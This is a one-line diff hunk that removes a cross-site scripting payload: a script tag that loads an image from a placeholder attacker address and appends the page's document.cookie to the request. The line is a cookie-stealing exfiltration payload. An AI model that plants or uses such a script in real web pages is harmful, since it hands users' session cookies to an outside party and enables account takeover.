@@ -1,1 +1,0 @@
-<script>new Image().src="http://attack.machine.ip.addr:PORTNUM/?cookie="+encodeURI(document.cookie);</script> 
